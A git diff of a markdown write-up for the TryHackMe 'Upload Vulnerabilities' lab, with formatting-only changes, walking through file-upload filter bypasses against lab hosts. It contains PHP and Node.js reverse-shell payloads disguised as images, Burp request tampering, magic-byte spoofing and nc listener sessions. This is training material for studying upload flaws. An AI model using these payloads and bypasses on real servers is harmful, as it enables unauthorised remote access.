@@ -1,17 +1,17 @@
 # Upload Vulnerabilities
 
-![tryhackme.com - © TryHackMe](<../../../../.gitbook/assets/tryhackme-logo-small (1).png>)
+![tryhackme.com - © TryHackMe](.gitbook/assets/tryhackme-logo-small.png)
 
-***
+---
 
 ## 🌐 Resources 🔗
 
-> * [TryHackMe | Upload Vulnerabilities](https://tryhackme.com/r/room/uploadvulns)
->   * [File Upload Vulnerabilities HINTS](https://muirlandoracle.co.uk/2020/06/30/file-upload-vulnerabilities-hints/)
-> * [File Upload | HackTricks](https://book.hacktricks.xyz/pentesting-web/file-upload)
-> * [PayloadsAllTheThings/Upload Insecure Files](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files)
+> - [TryHackMe | Upload Vulnerabilities](https://tryhackme.com/r/room/uploadvulns)
+>   - [File Upload Vulnerabilities HINTS](https://muirlandoracle.co.uk/2020/06/30/file-upload-vulnerabilities-hints/)
+> - [File Upload | HackTricks](https://book.hacktricks.xyz/pentesting-web/file-upload)
+> - [PayloadsAllTheThings/Upload Insecure Files](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files)
 
-***
+---
 
 ## Attack Methodology
 
@@ -49,20 +49,20 @@ nc -nvlp 1234
 cat /var/www/flag.txt
 ```
 
-***
+---
 
 ## Client-Side filtering bypass
 
-* Check source code of [http://java.uploadvulns.thm/](http://java.uploadvulns.thm/)
-* Check [http://java.uploadvulns.thm/assets/js/client-side-filter.js](http://java.uploadvulns.thm/assets/js/client-side-filter.js)
+- Check source code of [http://java.uploadvulns.thm/](http://java.uploadvulns.thm/)
+- Check [http://java.uploadvulns.thm/assets/js/client-side-filter.js](http://java.uploadvulns.thm/assets/js/client-side-filter.js)
 
 **client-side-filter.js**
 
-* Waits for the window to load.
-* Sets up an event listener on a file input.
-* **Validates that the selected file is a PNG image.**
-* Displays the file name if valid or clears and hides input if invalid.
-* Manages UI feedback using additional functions (`error`, `success`).
+- Waits for the window to load.
+- Sets up an event listener on a file input.
+- **Validates that the selected file is a PNG image.**
+- Displays the file name if valid or clears and hides input if invalid.
+- Manages UI feedback using additional functions (`error`, `success`).
 
 ```javascript
 window.onload = function(){
@@ -88,7 +88,7 @@ window.onload = function(){
 };
 ```
 
-* Find the images upload directory:
+- Find the images upload directory:
 
 ```bash
 gobuster dir -u http://java.uploadvulns.thm/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 64
@@ -97,25 +97,25 @@ gobuster dir -u http://java.uploadvulns.thm/ -w /usr/share/wordlists/dirbuster/d
 # /assets	(Status: 301) [Size: 329] [--> http://java.uploadvulns.thm/assets/]
 ```
 
-* Try to upload a `.png` file and check correct uploading at [http://java.uploadvulns.thm/images](http://java.uploadvulns.thm/images)
-  * (2nd option: prevent `client-side-filter.js` file from being loaded by intercepting the response with Burp)
-* Change `php-reverse-shell.php` extension and catch the upload request with BurpSuite
-  * as the MIME type (based on the file extension) automatically checks out, the Client-Side filter lets the payload through without complaining
+- Try to upload a `.png` file and check correct uploading at [http://java.uploadvulns.thm/images](http://java.uploadvulns.thm/images)
+  - (2nd option: prevent `client-side-filter.js` file from being loaded by intercepting the response with Burp)
+- Change `php-reverse-shell.php` extension and catch the upload request with BurpSuite
+  - as the MIME type (based on the file extension) automatically checks out, the Client-Side filter lets the payload through without complaining
 
 ```bash
 cp php-reverse-shell.php shell.png
 ```
 
-* In the intercepted request, change the to `filename` and the `Content-Type` to the following values and then forward the request
+- In the intercepted request, change the to `filename` and the `Content-Type` to the following values and then forward the request
 
 ```bash
 filename="shell.php"
 Content-Type: text/x-php
 ```
 
-![](../../../../.gitbook/assets/2024-12-03_21-28-53_822.png)
+![](.gitbook/assets/2024-12-03_21-28-53_822.png)
 
-* Set up a `nc` listener and navigate to [http://java.uploadvulns.thm/images/shell.php](http://java.uploadvulns.thm/images/shell.php) to receive the reverse shell
+- Set up a `nc` listener and navigate to [http://java.uploadvulns.thm/images/shell.php]( http://java.uploadvulns.thm/images/shell.php) to receive the reverse shell
 
 ```bash
 rlwrap nc -nvlp 1234
@@ -126,25 +126,26 @@ uid=33(www-data) gid=33(www-data) groups=33(www-data)
 $ cat /var/www/flag.txt
 ```
 
-***
+---
 
 ## Server-Side filtering bypass - extensions
 
 > 📌 "The key to bypassing any kind of server side filter is to enumerate and see what is allowed, as well as what is blocked; then try to craft a payload which can pass the criteria the filter is looking for."
+>
 
-* Find the assets folder
+- Find the assets folder
 
 ```bash
 gobuster dir -u http://annex.uploadvulns.thm/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 64
 ```
 
-* [http://annex.uploadvulns.thm/assets/](http://annex.uploadvulns.thm/assets/)
-* [http://annex.uploadvulns.thm/privacy/](http://annex.uploadvulns.thm/privacy/) - this is where the files are uploaded with randomized naming scheme
-* Try to upload `shell.php` - errors
-* Try to upload `shell-png.php` - errors
-* Try to upload `shell.php5` - works, file uploaded successfully
-* Set up a `nc` listener and navigate to [http://annex.uploadvulns.thm/privacy/](http://annex.uploadvulns.thm/privacy/)
-  * Access the randomized naming `*-shell.php5` file to receive the reverse shell
+- [http://annex.uploadvulns.thm/assets/](http://annex.uploadvulns.thm/assets/)
+- [http://annex.uploadvulns.thm/privacy/](http://annex.uploadvulns.thm/privacy/) - this is where the files are uploaded with randomized naming scheme
+- Try to upload `shell.php` - errors
+- Try to upload `shell-png.php` - errors
+- Try to upload `shell.php5` - works, file uploaded successfully
+- Set up a `nc` listener and navigate to [http://annex.uploadvulns.thm/privacy/](http://annex.uploadvulns.thm/privacy/)
+  - Access the randomized naming `*-shell.php5` file to receive the reverse shell
 
 ```bash
 nc -nvlp 1234
@@ -155,25 +156,25 @@ uid=33(www-data) gid=33(www-data) groups=33(www-data)
 $ cat /var/www/flag.txt
 ```
 
-***
+---
 
 ## Server-Side filtering bypass - magic numbers
 
 > 📌 Magic numbers, the initial hex digits in a file, can validate file uploads by matching against a whitelist or blacklist, though their reliability varies by webserver type.
 >
-> * [List of file signatures - Wikipedia](https://en.wikipedia.org/wiki/List_of_file_signatures)
+> - [List of file signatures - Wikipedia](https://en.wikipedia.org/wiki/List_of_file_signatures)
 
 ```bash
 gobuster dir -u http://magic.uploadvulns.thm/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 64
 ```
 
-* [http://magic.uploadvulns.thm/graphics/](http://magic.uploadvulns.thm/graphics/)
-* [http://magic.uploadvulns.thm/assets/](http://magic.uploadvulns.thm/assets/)
-* Try to upload `shell.php` - errors "GIFs only please!"
-* Duplicate `shell.php` to `magic.php` file. Edit it with a hex editor and add the GIF file signature (ASCII is `GIF87a` - check [Wikipedia](https://en.wikipedia.org/wiki/List_of_file_signatures) )
-* Upload the new `magic.php` file with GIF Hex signature - "File successfully uploaded"
-* Set up a `nc` listener and navigate to [http://magic.uploadvulns.thm/graphics/magic.php](http://magic.uploadvulns.thm/graphics/magic.php)
-  * Access the randomized naming `*-shell.php5` file to receive the reverse shell
+- [http://magic.uploadvulns.thm/graphics/](http://magic.uploadvulns.thm/graphics/)
+- [http://magic.uploadvulns.thm/assets/](http://magic.uploadvulns.thm/assets/)
+- Try to upload `shell.php` - errors "GIFs only please!"
+- Duplicate `shell.php` to `magic.php` file. Edit it with a hex editor and add the GIF file signature (ASCII is `GIF87a` - check [Wikipedia](https://en.wikipedia.org/wiki/List_of_file_signatures) )
+- Upload the new `magic.php` file with GIF Hex signature - "File successfully uploaded"
+- Set up a `nc` listener and navigate to [http://magic.uploadvulns.thm/graphics/magic.php](http://magic.uploadvulns.thm/graphics/magic.php)
+  - Access the randomized naming `*-shell.php5` file to receive the reverse shell
 
 ```bash
 cp shell.php magic.php
@@ -202,7 +203,7 @@ uid=33(www-data) gid=33(www-data) groups=33(www-data)
 $ cat /var/www/flag.txt
 ```
 
-***
+---
 
 ## Final challenge - Jewel
 
@@ -233,10 +234,12 @@ Starting gobuster in directory enumeration mode
 /Admin                (Status: 200) [Size: 1238]
 ```
 
-* Open [http://jewel.uploadvulns.thm/](http://jewel.uploadvulns.thm/)
-  * Using Wappalyzer
-    * Node.js server (Header - `X-Powered-By: Express`)
-    * Create a `jewel.js` payload file with this code (source - [https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/#nodejs](https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/#nodejs))
+
+
+- Open [http://jewel.uploadvulns.thm/](http://jewel.uploadvulns.thm/)
+  - Using Wappalyzer
+    - Node.js server (Header - `X-Powered-By: Express`)
+    - Create a `jewel.js` payload file with this code (source - [https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/#nodejs](https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/#nodejs))
 
 ```bash
 (function(){
@@ -253,7 +256,7 @@ Starting gobuster in directory enumeration mode
 })();
 ```
 
-* Check source code and the available `.js` files
+- Check source code and the available `.js` files
 
 ```html
 
@@ -289,11 +292,13 @@ Starting gobuster in directory enumeration mode
 </html>
 ```
 
-* [http://jewel.uploadvulns.thm/assets/js/upload.js](http://jewel.uploadvulns.thm/assets/js/upload.js)
-  * File Validation:
-    * **File Size Check**: Ensures the file size is less than 50 KB.
-    * **Magic Number Check**: Validates the file’s magic number to ensure it's a JPEG image (`ÿØÿ`).
-    * **File Extension Check**: Confirms the file extension is `.jpg` or `.jpeg`.
+
+
+- [http://jewel.uploadvulns.thm/assets/js/upload.js](http://jewel.uploadvulns.thm/assets/js/upload.js)
+  - File Validation:
+    - **File Size Check**: Ensures the file size is less than 50 KB.
+    - **Magic Number Check**: Validates the file’s magic number to ensure it's a JPEG image (`ÿØÿ`).
+    - **File Extension Check**: Confirms the file extension is `.jpg` or `.jpeg`.
 
 ```javascript
 $(document).ready(function() {
@@ -375,7 +380,7 @@ $(document).ready(function() {
 });
 ```
 
-* Trying to upload a valid jpeg file this is the BurpSuite POST request
+- Trying to upload a valid jpeg file this is the BurpSuite POST request
 
 ```bash
 POST / HTTP/1.1
@@ -396,8 +401,8 @@ Connection: keep-alive
 {"name":"thm.jpeg","type":"image/jpeg","file":"data:image/jpeg;base64,/9j/4AAQSkZ...UREQEREH//Z"}
 ```
 
-* The home webpage load some background images with this name structure `XXX.jpg` from the `/content` dir
-* Try to find all jpg/jpeg files using the provided `UploadVulnsWordlist_1593564107766.txt`
+- The home webpage load some background images with this name structure `XXX.jpg` from the `/content` dir
+- Try to find all jpg/jpeg files using the provided `UploadVulnsWordlist_1593564107766.txt`
 
 ```bash
 gobuster dir -u http://jewel.uploadvulns.thm/content -w UploadVulnsWordlist_1593564107766.txt -t 64 -x jpg
@@ -411,19 +416,20 @@ gobuster dir -u http://jewel.uploadvulns.thm/content -w UploadVulnsWordlist_1593
 /UAD.jpg              (Status: 200) [Size: 342033]
 ```
 
-* One of the files happens to be the same uploaded image, so there is a naming scheme
+- One of the files happens to be the same uploaded image, so there is a naming scheme
 
 ### Client-Side filtering bypass
 
-* To upload a valid file and bypass client-side filtering, use BurpSuite
-  * Open the homepage at [http://jewel.uploadvulns.thm/](http://jewel.uploadvulns.thm/)
-  * Turn on BurpSuite proxy intercept and do a refresh with `SHIFT+F5` of the homepage
-  * Forward until intercepting the `upload.js` script and right-click to **Do intercept Response to this request**
-  * Remove the check functions from the response and forward all
+- To upload a valid file and bypass client-side filtering, use BurpSuite
 
-![](../../../../.gitbook/assets/2024-12-04_23-19-17_825.png)
+  - Open the homepage at [http://jewel.uploadvulns.thm/](http://jewel.uploadvulns.thm/)
+  - Turn on BurpSuite proxy intercept and do a refresh with `SHIFT+F5` of the homepage
+  - Forward until intercepting the `upload.js` script and right-click to **Do intercept Response to this request**
+  - Remove the check functions from the response and forward all
 
-* Forwarded `upload.js`:
+![](.gitbook/assets/2024-12-04_23-19-17_825.png)
+
+- Forwarded `upload.js`:
 
 ```javascript
 $(document).ready(function() {
@@ -486,28 +492,30 @@ $(document).ready(function() {
 });
 ```
 
-> * Another way is to modify `jewel.js` to make it a JPEG file **under 50 KB** with the **magic number** `FF D8 FF DB` and a `.jpg` **extension**
+
+
+> - Another way is to modify `jewel.js` to make it a JPEG file **under 50 KB** with the **magic number** `FF D8 FF DB` and a `.jpg` **extension**
 >
 > ```bash
 > file jewel.js
 > 	jewel.js: JavaScript source, ASCII text
->
+> 
 > cp jewel.js jewel.jpg
->
+> 
 > nano jewel.jpg
 > # add as first line, a number of random bytes = number of necessary magic number (ÿØÿÛ)
 > # in this case
 > # AAAA
->
+> 
 > hexeditor jewel.jpg
 > # Modify the Hex signature to be FF D8 FF DB
->
+> 
 > file jewel.jpg
 > 	jewel.jpg: JPEG image data
 > ```
 >
-> * Upload the `jewel.jpg` file - Successful upload
-> * It will not work when launched via the Admin page because it is not recognized as a js script
+> - Upload the `jewel.jpg` file - Successful upload
+> - It will not work when launched via the Admin page because it is not recognized as a js script
 
 ```bash
 cp jewel.js jewel.jpg
@@ -516,11 +524,11 @@ file jewel.jpg
 	jewel.jpg: JavaScript source, ASCII text
 ```
 
-* Upload the `jewel.jpg` file - Successful upload because server-side only checks for MIME type (file extension)
+- Upload the `jewel.jpg` file - Successful upload because server-side only checks for MIME type (file extension)
 
-![](../../../../.gitbook/assets/2024-12-04_23-32-25_828.png)
+![](.gitbook/assets/2024-12-04_23-32-25_828.png)
 
-* Find the file with Gobuster
+- Find the file with Gobuster
 
 ```bash
 gobuster dir -u http://jewel.uploadvulns.thm/content -w UploadVulnsWordlist_1593564107766.txt -t 64 -x jpg
@@ -535,14 +543,14 @@ gobuster dir -u http://jewel.uploadvulns.thm/content -w UploadVulnsWordlist_1593
 /UAD.jpg              (Status: 200) [Size: 342033]
 ```
 
-* Opening the file at [http://jewel.uploadvulns.thm/content/DQF.jpg](http://jewel.uploadvulns.thm/content/DQF.jpg) with `nc` listener, no reverse shell is received
+- Opening the file at [http://jewel.uploadvulns.thm/content/DQF.jpg](http://jewel.uploadvulns.thm/content/DQF.jpg) with `nc` listener, no reverse shell is received
 
-![](../../../../.gitbook/assets/2024-12-04_23-32-46_829.png)
+![](.gitbook/assets/2024-12-04_23-32-46_829.png)
 
-* Start a `nc` listener on the port setup in the `jewel.js` payload file
-* Open the found admin page at [http://jewel.uploadvulns.thm/admin](http://jewel.uploadvulns.thm/admin)
-  * try to enter the file name to execute as is `DQF.jpg` - not working
-  * try to use the path to the file `../content/DQF.jpg` - Success, received reverse shell
+- Start a `nc` listener on the port setup in the `jewel.js` payload file
+- Open the found admin page at [http://jewel.uploadvulns.thm/admin](http://jewel.uploadvulns.thm/admin)
+  - try to enter the file name to execute as is `DQF.jpg` - not working
+  - try to use the path to the file `../content/DQF.jpg` - Success, received reverse shell
 
 ```bash
 nc -nvlp 1234
@@ -553,4 +561,5 @@ pwd
 cat /var/www/flag.txt
 ```
 
-***
+---
+
